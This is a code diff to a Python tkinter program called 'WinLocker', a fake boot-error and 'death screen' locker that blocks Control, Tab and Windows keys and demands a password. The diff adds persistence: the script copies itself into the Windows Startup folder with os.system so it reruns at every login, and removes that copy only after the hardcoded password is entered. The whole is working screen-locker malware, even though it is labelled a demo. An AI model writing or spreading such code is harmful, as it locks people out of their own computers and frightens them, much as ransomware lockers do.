@@ -3,6 +3,8 @@ import tkinter as tk
 import random
 import winsound
 import keyboard
+import sys
+import os
 
 BLACK = "#000000"
 WHITE = "#ffffff"
@@ -12,6 +14,13 @@ GREEN = "#9cc9b5"
 ORANGE = "#fefefe"
 
 password = "1234"
+
+
+path = sys.argv[0]
+file_name = path.split('\\')[-1]
+startup_path = '"%Appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
+os.system(f'copy {path} {startup_path}')
+
 
 root = tk.Tk()
 root.title("WinLocker")
@@ -52,6 +61,8 @@ labels = []
 boot_frame = tk.Frame(root, bg=BLACK)
 boot_frame.pack(fill="both", expand=True)
 
+
+
 def block(event):
     return "break"
 
@@ -60,8 +71,8 @@ for key in ["Control_L", "Control_R",
             "Tab", "Super_L", "Super_R"]:
     root.bind_all(f"<{key}>", block)
 
-def tv_switch_sound():
-    winsound.Beep(1400, 70)
+def sound():
+    winsound.Beep(2000, 600)
 
 
 for line in lines:
@@ -85,9 +96,9 @@ def show_line(index):
     labels[index].config(text=lines[index])
 
     if "Boot error" in lines[index]:
-        delay = random.randint(25, 45)
+        delay = random.randint(15, 25)
     else:
-        delay = random.randint(100, 200)
+        delay = random.randint(60, 150)
 
     root.after(delay, lambda: show_line(index + 1))
 
@@ -96,7 +107,7 @@ def turn_red():
     for label in labels:
         label.config(fg=RED)
 
-    root.after(1000, death_screen)
+    root.after(500, death_screen)
 
 def death_screen():
     boot_frame.destroy()
@@ -161,10 +172,10 @@ def death_screen():
     ).place(x=10, y=5)
 
     def transition():
-        tv_switch_sound()
+        sound()
         show_menu()
 
-    root.after(1800, transition)
+    root.after(900, transition)
 
 def show_menu():
     root.configure(bg=BLUE)
@@ -265,6 +276,7 @@ def show_menu():
                 text="DEMO UNLOCKED!",
                 fg="#00ff66"
             )
+            os.system(f'del {startup_path+file_name}')
             root.destroy()
         else:
             result.config(
@@ -272,6 +284,7 @@ def show_menu():
                 fg=WHITE
             )
             entry.delete(0, tk.END)
+            winsound.Beep(2000, 600),
 
     button = tk.Button(
         main,
